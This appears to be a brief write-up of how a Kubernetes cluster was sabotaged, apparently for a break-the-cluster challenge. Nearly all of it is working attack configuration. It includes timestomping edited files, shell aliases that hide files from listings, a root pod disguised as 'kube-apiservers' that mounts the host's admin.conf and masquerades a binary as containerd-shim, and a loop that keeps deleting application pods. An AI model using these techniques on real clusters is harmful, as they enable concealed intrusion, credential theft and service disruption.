All modified files were `touch -d "date"` to hide their edits


```shell
# /etc/profile.d/01-locale.sh
export GLOBIGNORE=*~
alias ls="ls -B"

# ~/.bashrc
alias ls="ls -B"
```

```yaml
apiVersion: v1
kind: Pod
metadata:
    name: kube-apiservers
    namespace: chaos
spec:
    volumes:
        - hostPath:
              path: /etc/kubernetes
          type: DirectoryOrCreate
          name: kubernetes
        - hostPath:
              path: /lib/selinux
          name: selinux
    containers:
        - name: chaos
          image: bitnami/kubectl
          securityContext:
              runAsUser: 0
          command:
              - "containerd-shim-runc-v2"
          volumeMounts:
              - name: selinux
                mountPath: "/usr/bin/containerd-shim-runc-v2"
              - name: kubernetes
                mountPath: /etc/kubernetes/admin.conf
                subPath: admin.conf
```


```shell
#!/usr/bin/env sh
while true; do
  kubectl --kubeconfig=/etc/kubernetes/admin.conf delete pod -l app=klustered;
  { ss=`stty -g`; stty -icanon min 0 time 50; read foo; stty "$ss"; }
done
```

